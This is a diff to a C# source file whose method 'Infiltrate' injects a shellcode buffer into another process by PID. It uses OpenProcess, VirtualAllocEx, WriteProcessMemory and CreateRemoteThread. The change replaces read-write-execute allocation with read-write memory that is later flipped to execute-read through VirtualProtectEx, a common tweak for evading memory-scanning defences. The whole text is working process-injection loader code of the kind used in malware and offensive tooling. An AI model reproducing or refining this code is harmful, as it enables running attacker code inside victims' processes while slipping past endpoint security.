@@ -32,6 +32,9 @@ namespace UsualNameSpace
         static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
             uint dwSize, uint flAllocationType, uint flProtect);
 
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
 
@@ -48,8 +51,25 @@ namespace UsualNameSpace
 
         const uint MEM_COMMIT = 0x00001000;
         const uint MEM_RESERVE = 0x00002000;
-        const uint PAGE_READWRITE = 4;
         const uint PAGE_EXECUTE_READWRITE = 0x40;
+        const uint PAGE_EXECUTE_READ = 0x20;
+        const uint PAGE_READWRITE = 0x04;
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
 
         public static int Infiltrate(string x86, string x64, int procPID)
         {
@@ -66,11 +86,14 @@ namespace UsualNameSpace
 
             IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
 
-            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
             UIntPtr bytesWritten;
             
             WriteProcessMemory(procHandle, allocMemAddress, sc, (uint)sc.Length, out bytesWritten);
+
+            MemoryProtection oldProtect;
+            VirtualProtectEx(procHandle, allocMemAddress, (uint)sc.Length, MemoryProtection.ExecuteRead, out oldProtect);
 
             CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
 
@@ -80,10 +103,6 @@ namespace UsualNameSpace
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
         public static extern bool IsWow64Process(System.IntPtr hProcess, out bool lpSystemInfo);
 
-        /// <summary>
-        /// Checks whether the process is 64-bit.
-        /// </summary>
-        /// <returns>Returns true if process is 64-bit, and false if process is 32-bit.</returns>
         public static bool IsWow64Process(Process process)
         {
             bool retVal = false;
